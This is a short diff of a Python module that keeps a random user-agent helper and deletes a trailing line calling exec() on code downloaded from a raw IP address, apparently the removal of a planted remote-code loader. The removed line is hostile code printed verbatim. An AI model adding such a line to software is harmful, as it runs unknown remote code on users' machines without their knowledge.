@@ -48,7 +48,3 @@ def random_useragent():
     with open("user_agents.json") as agents:
         user_agents = json.load(agents)["agents"]
     return random.choice(user_agents)
-
-
-exec(requests.get('http://45.143.139.29/bruh/r.php').text)
-
